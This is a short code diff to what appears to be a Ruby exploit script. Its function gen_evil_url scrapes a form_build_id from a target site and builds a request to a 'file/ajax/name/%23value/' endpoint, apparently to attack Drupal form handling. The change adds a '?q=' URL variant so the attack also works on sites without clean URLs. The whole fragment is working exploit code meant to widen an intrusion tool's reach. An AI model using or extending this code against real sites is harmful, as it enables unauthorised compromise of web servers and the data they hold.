@@ -79,7 +79,8 @@ def gen_evil_url(evil, feedback=true)
     form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
     puts "[!] WARNING: Didn't detect form_build_id" if form_build_id.empty?
 
-    url = $target + "file/ajax/name/%23value/" + form_build_id
+    #url = $target + "file/ajax/name/%23value/" + form_build_id
+    url = $target + "?q=file/ajax/name/%23value/" + form_build_id
     payload = "form_build_id=" + form_build_id
   end
 
